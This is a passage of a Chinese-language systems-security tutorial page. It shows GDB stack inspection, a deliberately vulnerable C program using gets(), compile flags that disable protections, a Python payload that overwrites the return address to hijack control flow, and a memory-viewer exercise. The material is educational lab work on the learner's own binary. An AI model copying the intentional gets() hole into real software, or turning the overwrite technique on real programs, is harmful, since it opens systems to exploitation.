+<a id="__codelineno-28-26" name="__codelineno-28-26" href="#__codelineno-28-26"></a>(gdb) c                # 继续运行到下一个断点（continue）
+<a id="__codelineno-28-27" name="__codelineno-28-27" href="#__codelineno-28-27"></a>(gdb) q                # 退出
+</code></pre></div>
+<h3 id="gdb_1">🧪 小实验：用 GDB 看看栈上的"返回地址"<a class="headerlink" href="#gdb_1" title="Permanent link">&para;</a></h3>
+<p>用第 4 节那个 <code>overflow.c</code>，编译时带 -g：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>gcc<span class="w"> </span>-g<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-o<span class="w"> </span>overflow<span class="w"> </span>overflow.c
+<a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>gdb<span class="w"> </span>./overflow
+</code></pre></div>
+<p>在 GDB 里：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>(gdb) b vulnerable         # 在 vulnerable 函数打断点
+<a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>(gdb) r                    # 运行
+<a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a># → 停在 vulnerable 的第一行
+<a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
+<a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>(gdb) disas vulnerable     # 反汇编，找到 ret 指令的地址
+<a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>(gdb) b *0x...             # 在 ret 指令处再打一个断点
+<a id="__codelineno-30-7" name="__codelineno-30-7" href="#__codelineno-30-7"></a>(gdb) c                    # 继续
+<a id="__codelineno-30-8" name="__codelineno-30-8" href="#__codelineno-30-8"></a>
+<a id="__codelineno-30-9" name="__codelineno-30-9" href="#__codelineno-30-9"></a># 现在程序停在 ret 之前。看栈：
+<a id="__codelineno-30-10" name="__codelineno-30-10" href="#__codelineno-30-10"></a>(gdb) x/20gx $rsp          # 查看栈顶 20 个 8 字节（g=giant word=8字节）
+<a id="__codelineno-30-11" name="__codelineno-30-11" href="#__codelineno-30-11"></a># 第一个值就是返回地址！
+</code></pre></div>
+<hr />
+<h2 id="7-gdb">7. 🧪 综合实验：用 GDB 观察栈溢出<a class="headerlink" href="#7-gdb" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>这个实验把 1-6 节的知识串起来。<strong>必须亲手做一遍。</strong></p>
+</blockquote>
+<h3 id="_30">实验准备<a class="headerlink" href="#_30" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a><span class="c1">// exp.c —— 故意制造栈溢出的程序</span>
+<a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
+<a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>
+<a id="__codelineno-31-5" name="__codelineno-31-5" href="#__codelineno-31-5"></a><span class="kt">void</span><span class="w"> </span><span class="nf">secret_function</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-31-6" name="__codelineno-31-6" href="#__codelineno-31-6"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;🎉 你成功劫持了程序控制流！</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-31-7" name="__codelineno-31-7" href="#__codelineno-31-7"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;这个函数本来不应该被调用的！</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-31-8" name="__codelineno-31-8" href="#__codelineno-31-8"></a><span class="p">}</span>
+<a id="__codelineno-31-9" name="__codelineno-31-9" href="#__codelineno-31-9"></a>
+<a id="__codelineno-31-10" name="__codelineno-31-10" href="#__codelineno-31-10"></a><span class="kt">void</span><span class="w"> </span><span class="nf">vulnerable</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-31-11" name="__codelineno-31-11" href="#__codelineno-31-11"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
+<a id="__codelineno-31-12" name="__codelineno-31-12" href="#__codelineno-31-12"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;buf 的地址: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">);</span>
+<a id="__codelineno-31-13" name="__codelineno-31-13" href="#__codelineno-31-13"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;secret_function 的地址: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">secret_function</span><span class="p">);</span>
+<a id="__codelineno-31-14" name="__codelineno-31-14" href="#__codelineno-31-14"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;请输入 payload: &quot;</span><span class="p">);</span>
+<a id="__codelineno-31-15" name="__codelineno-31-15" href="#__codelineno-31-15"></a><span class="w">    </span><span class="n">gets</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span><span class="w">  </span><span class="c1">// 故意用 gets</span>
+<a id="__codelineno-31-16" name="__codelineno-31-16" href="#__codelineno-31-16"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;你输入了: %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">buf</span><span class="p">);</span>
+<a id="__codelineno-31-17" name="__codelineno-31-17" href="#__codelineno-31-17"></a><span class="p">}</span>
+<a id="__codelineno-31-18" name="__codelineno-31-18" href="#__codelineno-31-18"></a>
+<a id="__codelineno-31-19" name="__codelineno-31-19" href="#__codelineno-31-19"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-31-20" name="__codelineno-31-20" href="#__codelineno-31-20"></a><span class="w">    </span><span class="n">vulnerable</span><span class="p">();</span>
+<a id="__codelineno-31-21" name="__codelineno-31-21" href="#__codelineno-31-21"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;程序正常结束了。</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-31-22" name="__codelineno-31-22" href="#__codelineno-31-22"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-31-23" name="__codelineno-31-23" href="#__codelineno-31-23"></a><span class="p">}</span>
+</code></pre></div>
+<h3 id="_31">实验步骤<a class="headerlink" href="#_31" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="c1"># 1. 编译（关保护）</span>
+<a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a>gcc<span class="w"> </span>-g<span class="w"> </span>-fno-stack-protector<span class="w"> </span>-z<span class="w"> </span>execstack<span class="w"> </span>-no-pie<span class="w"> </span>-o<span class="w"> </span>exp<span class="w"> </span>exp.c
+<a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a>
+<a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="c1"># 2. 记录 secret_function 的地址</span>
+<a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a>gdb<span class="w"> </span>./exp<span class="w"> </span>-q<span class="w"> </span>-ex<span class="w"> </span><span class="s2">&quot;p secret_function&quot;</span><span class="w"> </span>-ex<span class="w"> </span><span class="s2">&quot;q&quot;</span>
+<a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="c1"># 或者在 GDB 里: (gdb) p secret_function</span>
+<a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="c1"># 假设输出: {void ()} 0x401156 &lt;secret_function&gt;</span>
+<a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="c1"># 记住这个地址！比如 0x401156</span>
+<a id="__codelineno-32-9" name="__codelineno-32-9" href="#__codelineno-32-9"></a>
+<a id="__codelineno-32-10" name="__codelineno-32-10" href="#__codelineno-32-10"></a><span class="c1"># 3. 计算偏移量</span>
+<a id="__codelineno-32-11" name="__codelineno-32-11" href="#__codelineno-32-11"></a><span class="c1"># buf 是 64 字节，加上 RBP 的 8 字节 = 72 字节</span>
+<a id="__codelineno-32-12" name="__codelineno-32-12" href="#__codelineno-32-12"></a><span class="c1"># 所以第 73-80 字节是返回地址</span>
+<a id="__codelineno-32-13" name="__codelineno-32-13" href="#__codelineno-32-13"></a><span class="c1"># 偏移量 = 64 (buf) + 8 (rbp) = 72 字节</span>
+<a id="__codelineno-32-14" name="__codelineno-32-14" href="#__codelineno-32-14"></a>
+<a id="__codelineno-32-15" name="__codelineno-32-15" href="#__codelineno-32-15"></a><span class="c1"># 4. 构造 payload（用 Python）</span>
+<a id="__codelineno-32-16" name="__codelineno-32-16" href="#__codelineno-32-16"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;</span>
+<a id="__codelineno-32-17" name="__codelineno-32-17" href="#__codelineno-32-17"></a><span class="s1">import sys</span>
+<a id="__codelineno-32-18" name="__codelineno-32-18" href="#__codelineno-32-18"></a><span class="s1">addr = 0x401156  # 你的 secret_function 地址</span>
+<a id="__codelineno-32-19" name="__codelineno-32-19" href="#__codelineno-32-19"></a><span class="s1">payload = b&quot;A&quot; * 72                # 填充 buf + rbp</span>
+<a id="__codelineno-32-20" name="__codelineno-32-20" href="#__codelineno-32-20"></a><span class="s1">payload += addr.to_bytes(8, &quot;little&quot;)  # 小端序覆盖返回地址</span>
+<a id="__codelineno-32-21" name="__codelineno-32-21" href="#__codelineno-32-21"></a><span class="s1">sys.stdout.buffer.write(payload)</span>
+<a id="__codelineno-32-22" name="__codelineno-32-22" href="#__codelineno-32-22"></a><span class="s1">&#39;</span><span class="w"> </span>&gt;<span class="w"> </span>payload.bin
+<a id="__codelineno-32-23" name="__codelineno-32-23" href="#__codelineno-32-23"></a>
+<a id="__codelineno-32-24" name="__codelineno-32-24" href="#__codelineno-32-24"></a><span class="c1"># 5. 运行攻击</span>
+<a id="__codelineno-32-25" name="__codelineno-32-25" href="#__codelineno-32-25"></a>cat<span class="w"> </span>payload.bin<span class="w"> </span><span class="p">|</span><span class="w"> </span>./exp
+<a id="__codelineno-32-26" name="__codelineno-32-26" href="#__codelineno-32-26"></a><span class="c1"># 如果一切正常，你会看到：</span>
+<a id="__codelineno-32-27" name="__codelineno-32-27" href="#__codelineno-32-27"></a><span class="c1"># 🎉 你成功劫持了程序控制流！</span>
+<a id="__codelineno-32-28" name="__codelineno-32-28" href="#__codelineno-32-28"></a><span class="c1"># 然后程序崩溃（因为 secret_function 的返回地址是乱的）</span>
+<a id="__codelineno-32-29" name="__codelineno-32-29" href="#__codelineno-32-29"></a>
+<a id="__codelineno-32-30" name="__codelineno-32-30" href="#__codelineno-32-30"></a><span class="c1"># 6. 在 GDB 里观察整个过程</span>
+<a id="__codelineno-32-31" name="__codelineno-32-31" href="#__codelineno-32-31"></a>gdb<span class="w"> </span>./exp
+<a id="__codelineno-32-32" name="__codelineno-32-32" href="#__codelineno-32-32"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>b<span class="w"> </span>vulnerable
+<a id="__codelineno-32-33" name="__codelineno-32-33" href="#__codelineno-32-33"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>r<span class="w"> </span>&lt;<span class="w"> </span>payload.bin
+<a id="__codelineno-32-34" name="__codelineno-32-34" href="#__codelineno-32-34"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>n<span class="w">                          </span><span class="c1"># 执行 gets(buf)</span>
+<a id="__codelineno-32-35" name="__codelineno-32-35" href="#__codelineno-32-35"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>x/20gx<span class="w"> </span><span class="nv">$rsp</span><span class="w">                </span><span class="c1"># 看栈！返回地址已经被改成了 0x401156</span>
+<a id="__codelineno-32-36" name="__codelineno-32-36" href="#__codelineno-32-36"></a><span class="o">(</span>gdb<span class="o">)</span><span class="w"> </span>ni<span class="w">                         </span><span class="c1"># 单步执行 ret 指令</span>
+<a id="__codelineno-32-37" name="__codelineno-32-37" href="#__codelineno-32-37"></a><span class="c1"># → RIP 变成了 0x401156！程序跳到了 secret_function！</span>
+</code></pre></div>
+<h3 id="_32">实验报告（写在你自己的笔记里）<a class="headerlink" href="#_32" title="Permanent link">&para;</a></h3>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> buf 的地址是多少？</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 返回地址在 buf 上方多少字节？（如果你算的是 72，实验结果一致吗？）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 覆盖后的返回地址在栈上是什么样子的？（注意小端序——低位字节在前）</li>
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox" disabled/><span class="task-list-indicator"></span></label> 为什么 secret_function 执行完后程序崩溃了？（提示：它的返回地址是什么？）</li>
+</ul>
+<hr />
+<h2 id="8">8. 自己写一个内存查看器<a class="headerlink" href="#8" title="Permanent link">&para;</a></h2>
+<p>这个小工具让你直观感受"内存地址只是一个数字，你可以读任何地址"。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
+<a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
+<a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a><span class="c1">// 内存查看器：给定一个起始地址，打印周围的内存内容</span>
+<a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a><span class="kt">void</span><span class="w"> </span><span class="nf">memory_peek</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">num_bytes</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a><span class="w">    </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="n">addr</span><span class="p">;</span>
+<a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>
+<a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;地址 %p 附近的 %d 字节:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">addr</span><span class="p">,</span><span class="w"> </span><span class="n">num_bytes</span><span class="p">);</span>
+<a id="__codelineno-33-9" name="__codelineno-33-9" href="#__codelineno-33-9"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;偏移   十六进制                    可打印字符</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-33-10" name="__codelineno-33-10" href="#__codelineno-33-10"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;────   ────────────────────────    ──────────</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-33-11" name="__codelineno-33-11" href="#__codelineno-33-11"></a>
+<a id="__codelineno-33-12" name="__codelineno-33-12" href="#__codelineno-33-12"></a><span class="w">    </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">num_bytes</span><span class="p">;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="mi">16</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-33-13" name="__codelineno-33-13" href="#__codelineno-33-13"></a><span class="w">        </span><span class="c1">// 打印偏移</span>
+<a id="__codelineno-33-14" name="__codelineno-33-14" href="#__codelineno-33-14"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;+%-4d  &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">i</span><span class="p">);</span>
+<a id="__codelineno-33-15" name="__codelineno-33-15" href="#__codelineno-33-15"></a>
+<a id="__codelineno-33-16" name="__codelineno-33-16" href="#__codelineno-33-16"></a><span class="w">        </span><span class="c1">// 打印十六进制</span>
+<a id="__codelineno-33-17" name="__codelineno-33-17" href="#__codelineno-33-17"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">num_bytes</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-33-18" name="__codelineno-33-18" href="#__codelineno-33-18"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%02x &quot;</span><span class="p">,</span><span class="w"> </span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">j</span><span class="p">]);</span>
+<a id="__codelineno-33-19" name="__codelineno-33-19" href="#__codelineno-33-19"></a><span class="w">        </span><span class="p">}</span>
+<a id="__codelineno-33-20" name="__codelineno-33-20" href="#__codelineno-33-20"></a><span class="w">        </span><span class="c1">// 补齐空格</span>
+<a id="__codelineno-33-21" name="__codelineno-33-21" href="#__codelineno-33-21"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">num_bytes</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">16</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-33-22" name="__codelineno-33-22" href="#__codelineno-33-22"></a><span class="w">            </span><span class="c1">// skip padding for incomplete last line</span>
+<a id="__codelineno-33-23" name="__codelineno-33-23" href="#__codelineno-33-23"></a><span class="w">        </span><span class="p">}</span>
+<a id="__codelineno-33-24" name="__codelineno-33-24" href="#__codelineno-33-24"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;   &quot;</span><span class="p">);</span>
+<a id="__codelineno-33-25" name="__codelineno-33-25" href="#__codelineno-33-25"></a>
+<a id="__codelineno-33-26" name="__codelineno-33-26" href="#__codelineno-33-26"></a><span class="w">        </span><span class="c1">// 打印可打印字符（不可打印的显示为 .）</span>
+<a id="__codelineno-33-27" name="__codelineno-33-27" href="#__codelineno-33-27"></a><span class="w">        </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="p">(</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">j</span><span class="p">)</span><span class="w"> </span><span class="o">&lt;</span><span class="w"> </span><span class="n">num_bytes</span><span class="p">;</span><span class="w"> </span><span class="n">j</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-33-28" name="__codelineno-33-28" href="#__codelineno-33-28"></a><span class="w">            </span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p</span><span class="p">[</span><span class="n">i</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">j</span><span class="p">];</span>
+<a id="__codelineno-33-29" name="__codelineno-33-29" href="#__codelineno-33-29"></a><span class="w">            </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;%c&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="n">c</span><span class="w"> </span><span class="o">&gt;=</span><span class="w"> </span><span class="mi">32</span><span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">&lt;=</span><span class="w"> </span><span class="mi">126</span><span class="p">)</span><span class="w"> </span><span class="o">?</span><span class="w"> </span><span class="n">c</span><span class="w"> </span><span class="o">:</span><span class="w"> </span><span class="sc">&#39;.&#39;</span><span class="p">);</span>
+<a id="__codelineno-33-30" name="__codelineno-33-30" href="#__codelineno-33-30"></a><span class="w">        </span><span class="p">}</span>
+<a id="__codelineno-33-31" name="__codelineno-33-31" href="#__codelineno-33-31"></a><span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-33-32" name="__codelineno-33-32" href="#__codelineno-33-32"></a><span class="w">    </span><span class="p">}</span>
+<a id="__codelineno-33-33" name="__codelineno-33-33" href="#__codelineno-33-33"></a><span class="p">}</span>
+<a id="__codelineno-33-34" name="__codelineno-33-34" href="#__codelineno-33-34"></a>
+<a id="__codelineno-33-35" name="__codelineno-33-35" href="#__codelineno-33-35"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-33-36" name="__codelineno-33-36" href="#__codelineno-33-36"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">a</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">42</span><span class="p">;</span>
+<a id="__codelineno-33-37" name="__codelineno-33-37" href="#__codelineno-33-37"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">str</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&quot;Hello, memory!&quot;</span><span class="p">;</span>
+<a id="__codelineno-33-38" name="__codelineno-33-38" href="#__codelineno-33-38"></a><span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">99</span><span class="p">;</span>
+<a id="__codelineno-33-39" name="__codelineno-33-39" href="#__codelineno-33-39"></a>
+<a id="__codelineno-33-40" name="__codelineno-33-40" href="#__codelineno-33-40"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;=== 变量 a (int, 值=42) 的内存 ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-33-41" name="__codelineno-33-41" href="#__codelineno-33-41"></a><span class="w">    </span><span class="n">memory_peek</span><span class="p">(</span><span class="o">&amp;</span><span class="n">a</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span>
+<a id="__codelineno-33-42" name="__codelineno-33-42" href="#__codelineno-33-42"></a>
+<a id="__codelineno-33-43" name="__codelineno-33-43" href="#__codelineno-33-43"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">=== 变量 str (char[], 值=</span><span class="se">\&quot;</span><span class="s">Hello, memory!</span><span class="se">\&quot;</span><span class="s">) 的内存 ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-33-44" name="__codelineno-33-44" href="#__codelineno-33-44"></a><span class="w">    </span><span class="n">memory_peek</span><span class="p">(</span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span><span class="p">);</span>
+<a id="__codelineno-33-45" name="__codelineno-33-45" href="#__codelineno-33-45"></a>
+<a id="__codelineno-33-46" name="__codelineno-33-46" href="#__codelineno-33-46"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">=== 变量 b (int, 值=99) 的内存 ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-33-47" name="__codelineno-33-47" href="#__codelineno-33-47"></a><span class="w">    </span><span class="n">memory_peek</span><span class="p">(</span><span class="o">&amp;</span><span class="n">b</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span><span class="p">);</span>
+<a id="__codelineno-33-48" name="__codelineno-33-48" href="#__codelineno-33-48"></a>
+<a id="__codelineno-33-49" name="__codelineno-33-49" href="#__codelineno-33-49"></a><span class="w">    </span><span class="c1">// 看看三个变量在内存中的位置关系</span>
+<a id="__codelineno-33-50" name="__codelineno-33-50" href="#__codelineno-33-50"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;</span><span class="se">\n</span><span class="s">=== 地址对比 ===</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
+<a id="__codelineno-33-51" name="__codelineno-33-51" href="#__codelineno-33-51"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;a 的地址:   %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a</span><span class="p">);</span>
+<a id="__codelineno-33-52" name="__codelineno-33-52" href="#__codelineno-33-52"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;str 的地址: %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="n">str</span><span class="p">);</span>
+<a id="__codelineno-33-53" name="__codelineno-33-53" href="#__codelineno-33-53"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;b 的地址:   %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">void</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">b</span><span class="p">);</span>
+<a id="__codelineno-33-54" name="__codelineno-33-54" href="#__codelineno-33-54"></a><span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;a 和 b 的距离: %ld 字节</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">a</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="p">(</span><span class="kt">char</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">b</span><span class="p">);</span>
+<a id="__codelineno-33-55" name="__codelineno-33-55" href="#__codelineno-33-55"></a>
+<a id="__codelineno-33-56" name="__codelineno-33-56" href="#__codelineno-33-56"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-33-57" name="__codelineno-33-57" href="#__codelineno-33-57"></a><span class="p">}</span>
+</code></pre></div>
+<p>运行它，观察：
+- a、str、b 在内存中的相对位置
+- 你能在 str 附近看到 "Hello, memory!" 的 ASCII 码吗？
+- a 的值 42（十六进制 0x2A）存储的格式是什么？（小端序：2A 00 00 00）</p>
+<hr />
+<h2 id="_33">🧵 实际案例串联<a class="headerlink" href="#_33" title="Permanent link">&para;</a></h2>
+<p>学完本章，你可以理解以下真实安全事件的技术原理：</p>
